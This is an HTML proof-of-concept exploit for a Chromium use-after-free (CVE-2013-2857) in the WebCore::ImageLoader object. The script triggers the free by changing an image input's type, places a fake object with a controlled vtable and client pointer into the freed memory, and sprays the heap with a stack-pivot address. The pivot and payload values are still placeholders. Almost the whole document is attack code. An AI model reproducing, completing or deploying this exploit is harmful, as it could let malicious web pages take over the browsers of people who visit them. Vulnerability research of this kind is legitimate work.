<!--
Tested on 5.5.1
CVE-2013-2857
Use after free https://bugs.chromium.org/p/chromium/issues/detail?id=240124
Result: Bug is present, crash on what is presumably render
-->
<script>
function UaF(a)
{
	var pivotAdressAdress = 0x0000513f;
	var baseLibWebkit = 0x88888888;
	var pivotAdress = baseLibWebkit + 0x0;
	var sizeWebCoreImageLoader = 0x20;
	var sprayCount = 0x10000000;
	
	//button is the *ONLY* type that left the freed WebCore::ImageLoader free !
	a.type="button";
	
	//Allocate this new WebCore::ImageLoader over freed WebCore::ImageLoader
	var t = new DataView(new ArrayBuffer(sizeWebCoreImageLoader));
	/*
	0:000:x86> dt chrome!WebCore::ImageLoader
	   +0x000 __VFN_table : Ptr32 
	   +0x004 m_client         : Ptr32 WebCore::ImageLoaderClient
	   +0x008 m_image          : WebCore::CachedResourceHandle<WebCore::CachedImage>
	   +0x00c m_failedLoadURL  : WTF::AtomicString
	   +0x010 m_hasPendingBeforeLoadEvent : Pos 0, 1 Bit
	   +0x010 m_hasPendingLoadEvent : Pos 1, 1 Bit
	   +0x010 m_hasPendingErrorEvent : Pos 2, 1 Bit
	   +0x010 m_imageComplete  : Pos 3, 1 Bit
	   +0x010 m_loadManually   : Pos 4, 1 Bit
	   +0x010 m_elementIsProtected : Pos 5, 1 Bit
	*/
	t.setUint32(0x00, 0x41414141); //vtable
	t.setUint32(0x04, pivotAdressAdress); //m_client
	t.setUint32(0x08, 0x00000000); //m_image
	t.setUint32(0x0C, 0x44444444); //m_failedLoadURL
	t.setUint32(0x10, 0x45454545); //padding
	t.setUint32(0x14, 0x46464646);
	t.setUint32(0x18, 0x47474747);
	
	//Spray pivotAdress
	var dv = new DataView(new ArrayBuffer(sprayCount));
	for(var i=0; i<sprayCount; i+=4){
		dv.setUint32(i, pivotAdress);
	}
	
	//Use the new WebCore::ImageLoader & pivot !
	return 0;
}
</script>

<input id="x" type="image" onerror="UaF(this);" src=""/>
